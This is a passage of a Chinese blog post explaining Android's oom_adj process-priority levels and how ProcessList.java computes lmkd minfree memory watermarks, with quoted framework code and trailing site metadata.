可感知进程：当该进程存在不可见的 Activity，但 Activity 正处于 PAUSING、PAUSED、STOPPING 状态，则为 PERCEPTIBLE_APP_ADJ 12345678910111213141516171819202122232425262728293031323334353637if (!foregroundActivities &amp;&amp; activitiesSize &gt; 0) { int minLayer = ProcessList.VISIBLE_APP_LAYER_MAX; for (int j = 0; j &lt; activitiesSize; j++) { final ActivityRecord r = app.activities.get(j); if (r.visible) { ... } else if (r.state == ActivityState.PAUSING || r.state == ActivityState.PAUSED) { if (adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) { adj = ProcessList.PERCEPTIBLE_APP_ADJ; app.adjType = &quot;pause-activity&quot;; } if (procState &gt; PROCESS_STATE_CUR_TOP) { procState = PROCESS_STATE_CUR_TOP; app.adjType = &quot;pause-activity&quot;; } schedGroup = ProcessList.SCHED_GROUP_DEFAULT; app.cached = false; app.empty = false; foregroundActivities = true; } else if (r.state == ActivityState.STOPPING) { if (adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) { adj = ProcessList.PERCEPTIBLE_APP_ADJ; app.adjType = &quot;stop-activity&quot;; } if (!r.finishing) { if (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) { procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY; app.adjType = &quot;stop-activity&quot;; } } app.cached = false; app.empty = false; foregroundActivities = true; } }} 满足以下任一条件的进程也属于可感知进程: foregroundServices 非空：前台服务进程，执行 startForegroundService () 方法 app.forcingToImportant 非空：执行 setProcessImportant () 方法，比如 Toast 弹出过程。 hasOverlayUi 非空：非 activity 的 UI 位于屏幕最顶层，比如显示类型 TYPE_APPLICATION_OVERLAY 的窗口 # 5. SERVICE_ADJ(500) 服务进程：没有启动过 Activity，并且 30 分钟之内活跃过的服务进程。 startRequested 为 true，则代表执行 startService () 且没有 stop 的进程。 1234567891011121314151617181920212223242526for (int is = app.services.size()-1; is &gt;= 0; is--) { ServiceRecord s = app.services.valueAt(is); if (s.startRequested) { app.hasStartedServices = true; if (procState &gt; ActivityManager.PROCESS_STATE_SERVICE) { procState = ActivityManager.PROCESS_STATE_SERVICE; app.adjType = &quot;started-services&quot;; } if (app.hasShownUi &amp;&amp; app != mHomeProcess) { if (adj &gt; ProcessList.SERVICE_ADJ) { app.adjType = &quot;cch-started-ui-services&quot;; } } else { if (now &lt; (s.lastActivity + mConstants.MAX_SERVICE_INACTIVITY)) { if (adj &gt; ProcessList.SERVICE_ADJ) { adj = ProcessList.SERVICE_ADJ; app.adjType = &quot;started-services&quot;; app.cached = false; } } } } for (int conni = s.connections.size()-1; conni &gt;= 0; conni--) { ... //根据client情况来调整adj }} # 6. SERVICE_B_ADJ(800) 进程由 SERVICE_ADJ (500) 降低到 SERVICE_B_ADJ (800)，有以下两种情况： A 类 Service 占比过高：当 A 类 Service 个数 &gt; Service 总数的 1/3 时，则加入到 B 类 Service。换句话说，B Service 的个数至少是 A Service 的 2 倍。 内存紧张并且 A 类 Service 占用内存较高：当系统内存紧张级别 (mLastMemoryLevel) 高于 ADJ_MEM_FACTOR_NORMAL，且该应用所占内存 lastPss 大于或等于 CACHED_APP_MAX_ADJ 级别所对应的内存阈值的 1/3（默认值阈值约等于 110MB）。 1234567891011121314151617181920if (adj == ProcessList.SERVICE_ADJ) { if (doingAll) { app.serviceb = mNewNumAServiceProcs &gt; (mNumServiceProcs/3); mNewNumServiceProcs++; if (!app.serviceb) { if (mLastMemoryLevel &gt; ProcessStats.ADJ_MEM_FACTOR_NORMAL &amp;&amp; app.lastPss &gt;= mProcessList.getCachedRestoreThresholdKb()) { app.serviceHighRam = true; app.serviceb = true; } else { mNewNumAServiceProcs++; } } else { app.serviceHighRam = false; } } if (app.serviceb) { adj = ProcessList.SERVICE_B_ADJ; }} # 7. CACHED_APP_MIN_ADJ(900) 缓存进程优先级从 CACHED_APP_MIN_ADJ (900) 到 CACHED_APP_MAX_ADJ (906)。 ADJ 的转换算法： cached: 900, 901, 903, 905 empty: 900, 902, 904, 906 12345678910111213141516171819final int N = mLruProcesses.size();//numSlots等于3int numSlots = (ProcessList.CACHED_APP_MAX_ADJ - ProcessList.CACHED_APP_MIN_ADJ + 1) / 2;//mNumNonCachedProcs是指empty和cached之外的进程， mNumCachedHiddenProcs代表的是cached进程个数int numEmptyProcs = N - mNumNonCachedProcs - mNumCachedHiddenProcs;if (numEmptyProcs &gt; cachedProcessLimit) { numEmptyProcs = cachedProcessLimit;}//emptyFactor和cachedFactor分别代表每个slot里面包括的进程个数，大于或等于1int emptyFactor = numEmptyProcs/numSlots;int cachedFactor = (mNumCachedHiddenProcs &gt; 0 ? mNumCachedHiddenProcs : 1)/numSlots; app.curRawAdj = curEmptyAdj; ... //ADJ阈值 app.curAdj = app.modifyRawOomAdj(curEmptyAdj); ... }} # 8. schedGroup Android 进程优先级 ADJ 的每一个 ADJ 级别往往都有多种场景，使用 adjType 完美地区分相同 ADJ 下的不同场景； 不同 ADJ 进程所对应的 schedGroup 不同，从而分配的 CPU 资源也不同，schedGroup 大体分为 TOP (T)、前台 (F)、后台 (B)； ADJ 跟 AMS 中的 procState 有着紧密的联系。 adj：通过调整 oom_score_adj 来影响进程寿命 (Lowmemorykiller 杀进程策略)； schedGroup：影响进程的 CPU 资源调度与分配； procState：从进程所包含的四大组件运行状态来评估进程状态，影响 framework 的内存控制策略。比如控制缓存进程和空进程个数上限依赖于 procState，再比如控制 APP 执行 handleLowMemory () 的触发时机等。 为了说明整体关系，以 ADJ 为中心来讲解跟 adjType,schedGroup,procState 的对应关系，下面以一幅图来诠释整个 ADJ 算法的精髓，几乎涵盖了 ADJ 算法调整的绝大多数场景。 # 3. sys.lmk.minfree_levels ProcessList.java 会在初始化时将 oom_adj 的 minfree 水位更新给 lmkd，并由 lmkd 配置到 prop sys.lmk.minfree_levels 中。 frameworks/base/services/core/java/com/android/server/am/ProcessList.java 1234567891011121314private void updateOomLevels(int displayWidth, int displayHeight, boolean write) { ... if (write) { ByteBuffer buf = ByteBuffer.allocate(4 * (2 * mOomAdj.length + 1)); buf.putInt(LMK_TARGET); for (int i = 0; i &lt; mOomAdj.length; i++) { buf.putInt((mOomMinFree[i] * 1024)/PAGE_SIZE); buf.putInt(mOomAdj[i]); } writeLmkd(buf, null); ... }} 通过代码可知，会将 mOomMinFree 的水位数组以 page 形式传递给 lmkd。 mOomAdj 数组是代码固定的： 1234private final int[] mOomAdj = new int[] { FOREGROUND_APP_ADJ, VISIBLE_APP_ADJ, PERCEPTIBLE_APP_ADJ, PERCEPTIBLE_LOW_APP_ADJ, CACHED_APP_MIN_ADJ, CACHED_APP_LMK_FIRST_ADJ}; 目前没有配置的方式，如果需要修改等级，只能修改源码。 mOomMinFree 数组是通过算法计算 上图大致整理了整个水位的计算过程，下面详细剖析这个过程。 # 3.1 确定 scale ​ float scaleMem = ((float) (mTotalMemMb - 350)) / (700 - 350); // Scale buckets from screen size. int minSize = 480 * 800; // 384000 int maxSize = 1280 * 800; // 1024000 230400 870400 .264 float scaleDisp = ((float)(displayWidth * displayHeight) - minSize) / (maxSize - minSize); if (false) { Slog.i(&quot;XXXXXX&quot;, &quot;scaleMem=&quot; + scaleMem); Slog.i(&quot;XXXXXX&quot;, &quot;scaleDisp=&quot; + scaleDisp + &quot; dw=&quot; + displayWidth + &quot; dh=&quot; + displayHeight); } float scale = scaleMem &gt; scaleDisp ? scaleMem : scaleDisp; if (scale &lt; 0) scale = 0; else if (scale &gt; 1) scale = 1; 主要分两部分，内存和分辨率。 确认内存是否超过 700M，如果低于 700M，将会有个 scaleMem 百分比； 确认分辨率是否超过 1280*800，如果低于，将会有个 scaleDisp 百分比； 通过 scaleMem 和 scaleDisp，取其中最大百分比，不超过 1； 按照目前设备来说，手机设备的内存基本都是超过 700M 的，所以，无论手机分辨率，scale 都为 1 的。 # 3.2 初步计算 mOomMinFree 12345678910 for (int i = 0; i &lt; mOomAdj.length; i++) {​ int low = mOomMinFreeLow[i];​ int high = mOomMinFreeHigh[i];​ if (is64bit) {​ // Increase the high min-free levels for cached processes for 64-bit​ if (i == 4) high = (high * 3) / 2;​ else if (i == 5) high = (high * 7) / 4;​ }​ mOomMinFree[i] = (int)(low + ((high - low) * scale));​ } ProcessList.java 中定义了两个数组： private final int[] mOomMinFreeLow = new int[] { 12288, 18432, 24576, 36864, 43008, 49152 }; // These are the high-end OOM level limits. This is appropriate for a // 1280x800 or larger screen with around 1GB RAM. Values are in KB. private final int[] mOomMinFreeHigh = new int[] { 73728, 92160, 110592, 129024, 147456, 184320 }; 这个是默认的水位，按照 3.1 节，scale 对于手机设备值是为 1 的，也就是说 mOomMinFree 最终取值是按照 high。而 high 对于 64 位系统对于最后两个等级会进行放大。 # 3.3 进一步计算 mOomMinFree if (minfree_abs &gt;= 0) { for (int i = 0; i &lt; mOomAdj.length; i++) { mOomMinFree[i] = (int)((float)minfree_abs * mOomMinFree[i] / mOomMinFree[mOomAdj.length - 1]); } } if (minfree_adj != 0) { for (int i = 0; i &lt; mOomAdj.length; i++) { mOomMinFree[i] += (int)((float) minfree_adj * mOomMinFree[i] / mOomMinFree[mOomAdj.length - 1]); if (mOomMinFree[i] &lt; 0) { mOomMinFree[i] = 0; } } } 系统中还提供了两个 config，用以对默认的 minFree 进行一定的缩放： int minfree_adj = Resources.getSystem().getInteger( com.android.internal.R.integer.config_lowMemoryKillerMinFreeKbytesAdjust); int minfree_abs = Resources.getSystem().getInteger( com.android.internal.R.integer.config_lowMemoryKillerMinFreeKbytesAbsolute); 对于设定 minfree_abs 的 config 值时，mOomMinFree 会按照 minfree_abs 进行比例缩放； 对于设定 minfree_adj 的 config 值时，mOomMinFree 是按照 minfree_adj 进行比例增加； Q1 控制 oom adj 水位策略 当 lmkd 触发，应该是系统中的内存超出了我们设定的界限，需要根据内存的使用情况判断 adj 的 level，进而 kill 相关的进程，而 adj level 和进程状态都是在 AMS 中修改。我们能做的就是控制 mOomMinFree 和 oom_adj 的 6 个 level。 最低 level 的 oom_adj 对应的 minfree 是内存最小的时候，这个时候内存严重紧张，应控制 oom_adj level，使其在此时不要 kill 重要进程。可以根据情况减小 mOomMinFreeHigh [0]、mOomMinFreeHigh [1] 等低等级的内存值，使其在内存很小情况下才触发 lmkd； 最高 level 的 oom_adj 对应 minfree 是内存部分紧张，只是想 lmkd 将不重要的进程 kill 掉，所以，可以放大 mOomMinFreeHigh [4]、mOomMinFreeHigh [5] 使其在内存快要紧张的时候，尽快把不重要的进程 kill； 将重要的进程尽量放 mOomAdj 的低 level 中 # 五、分析结论","link":"/2022/05/14/LMK/"}],"tags":[{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"Kernel","slug":"Kernel","link":"/tags/Kernel/"},{"name":"qemu","slug":"qemu","link":"/tags/qemu/"},{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"flask","slug":"flask","link":"/tags/flask/"},{"name":"leetcode","slug":"leetcode","link":"/tags/leetcode/"},{"name":"vue","slug":"vue","link":"/tags/vue/"},{"name":"数据结构","slug":"数据结构","link":"/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"arm","slug":"arm","link":"/tags/arm/"},{"name":"android","slug":"android","link":"/tags/android/"}],"categories":[{"name":"pwn","slug":"pwn","link":"/categories/pwn/"},{"name":"Kernel","slug":"Kernel","link":"/categories/Kernel/"},{"name":"qemu","slug":"qemu","link":"/categories/qemu/"},{"name":"随笔","slug":"随笔","link":"/categories/%E9%9A%8F%E7%AC%94/"},{"name":"flask","slug":"flask","link":"/categories/flask/"},{"name":"leetcode","slug":"leetcode","link":"/categories/leetcode/"},{"name":"pwnable.tw","slug":"pwnable-tw","link":"/categories/pwnable-tw/"},{"name":"vue","slug":"vue","link":"/categories/vue/"},{"name":"数据结构","slug":"数据结构","link":"/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"arm","slug":"arm","link":"/categories/arm/"},{"name":"android","slug":"android","link":"/categories/android/"}]}